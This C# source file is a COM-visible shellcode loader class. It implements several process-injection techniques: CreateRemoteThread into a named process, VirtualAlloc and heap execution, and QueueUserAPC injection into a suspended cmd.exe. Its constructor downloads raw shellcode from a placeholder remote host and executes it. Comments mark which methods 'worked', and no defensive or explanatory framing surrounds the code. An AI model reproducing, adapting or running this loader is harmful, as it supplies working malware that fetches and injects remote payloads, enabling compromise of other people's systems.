using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Injection
{
    [ComVisible(true)]
    public class Injection
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }

        [Flags]
        public enum ProcessCreationFlags : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }

        private delegate IntPtr SC();
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;
        public const ushort PAGE_EXECUTE_READWRITE = 0x40;
        public const ushort PAGE_EXECUTE_READ = 0x20;
        public const ushort PAGE_READWRITE = 0x04;

        const uint MEM_RESERVE = 0x00002000;
        private static UInt32 MEM_COMMIT = 0x1000;
        const uint HEAP_CREATE_ENABLE_EXECUTE = 0x00040000;

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, out IntPtr lpThreadId);

        //
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, Int32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr HeapCreate(uint flOptions, uint dwInitialsize, uint dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwSize);

        // Get context of thread x64, in x64 application
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ResumeThread(IntPtr hThread);

        // Get context of thread x64, in x64 application
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
                            bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
                           string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static bool RemoteInject(String proc, byte[] shellcode)
        {
            GCHandle SCHandle = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
            IntPtr SCPointer = SCHandle.AddrOfPinnedObject();

            Process targetProcess = Process.GetProcessesByName(proc)[0];
            IntPtr processHandle = OpenProcess(ProcessAccessFlags.All, false, targetProcess.Id);

            IntPtr allocMemAddress = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)shellcode.Length, (uint)MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            UIntPtr bytesWritten = UIntPtr.Zero;
            WriteProcessMemory(processHandle, allocMemAddress, shellcode, shellcode.Length, out bytesWritten);

            IntPtr iThreadId = IntPtr.Zero;
            IntPtr hThread = CreateRemoteThread(processHandle, IntPtr.Zero, UIntPtr.Zero, allocMemAddress, IntPtr.Zero, 0, out iThreadId);

            if (hThread == IntPtr.Zero) return false;

            return true;
        }

        private void Inject(byte[] shellcode)
        {
            GCHandle SCHandle = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
            IntPtr SCPointer = SCHandle.AddrOfPinnedObject();
            uint flOldProtect;



            if (VirtualProtect(SCPointer, (UIntPtr)shellcode.Length, 0x40, out flOldProtect)) //PAGE_EXECUTE_READWRITE
            //if (VirtualProtect(SCPointer, (UIntPtr)shellcode.Length, 0x20, out flOldProtect)) //PAGE_EXECUTEREAD
            {
                SC sc = (SC)Marshal.GetDelegateForFunctionPointer(SCPointer, typeof(SC));
                sc();
            }
        }

        public void VirtualAllocLaunch(byte[] shellcode)
        {

            IntPtr funcAddr = VirtualAlloc(0, shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        public void VirtualAllocLaunch2(byte[] shellcode)
        {

            IntPtr funcAddr = VirtualAlloc(0, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            uint oldprotection;
            VirtualProtect((IntPtr)(funcAddr), shellcode.Length, PAGE_EXECUTE_READWRITE, out oldprotection);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }


        public void HeapLaunch(byte[] shellcode)
        {
            IntPtr heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
            IntPtr ptr = HeapAlloc(heapp, 0, (UInt32)shellcode.Length);
            UInt32 threadId = 0;
            //IntPtr pinfo = IntPtr.Zero;
            Marshal.Copy(shellcode, 0, (IntPtr)heapp, shellcode.Length);
            IntPtr ht = CreateThread(0, 0, heapp, ptr, 0, ref threadId);
            WaitForSingleObject(ht, 0xFFFFFFFF);
            //return;
        }


        public void qu_apc(byte[] shellcode)
        {
            IntPtr resultPtr = VirtualAlloc(0, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            IntPtr bytesWritten = IntPtr.Zero;
            Marshal.Copy(shellcode, 0, (IntPtr)resultPtr, shellcode.Length);
            IntPtr ptr = QueueUserAPC(resultPtr, GetCurrentThread(), IntPtr.Zero);
        }

        public void qu_apc_spawn(byte[] shellcode)
        {
            GCHandle SCHandle = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
            IntPtr SCPointer = SCHandle.AddrOfPinnedObject();
            string processpath = @"C:\Windows\system32\cmd.exe";
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool success = CreateProcess(processpath, null,
                IntPtr.Zero, IntPtr.Zero, false,
                ProcessCreationFlags.CREATE_SUSPENDED,
                IntPtr.Zero, null, ref si, out pi);
            Thread.Sleep(3000);
            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
            UIntPtr bytesWritten = UIntPtr.Zero;
            bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, shellcode, shellcode.Length, out bytesWritten);
            Process targetProc = Process.GetProcessById((int)pi.dwProcessId);
            ProcessThreadCollection currentThreads = targetProc.Threads;
            IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, currentThreads[0].Id);
            uint oldProtect = 0;
            resultBool = VirtualProtectEx(pi.hProcess, resultPtr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
            IntPtr ptr = QueueUserAPC(resultPtr, sht, IntPtr.Zero);
            IntPtr ThreadHandle = pi.hThread;
            ResumeThread(ThreadHandle);
        }


        public Injection()
        {
            //string process = "testz";
            byte[] shellcode = new WebClient().DownloadData(@"http://X.X.X.X:80/xxxx.bin"); // download raw .bin shellcode
            //RemoteInject(process, shellcode); // worked
            //Inject(shellcode); // worked
            //VirtualAllocLaunch(shellcode); // worked
            //HeapLaunch(shellcode); // doesn't work well with a stageless payload, but works staged
            //qu_apc(shellcode); // worked
            //RemoteInject(process, shellcode); // worked
            qu_apc_spawn(shellcode); // worked
        }
    }
}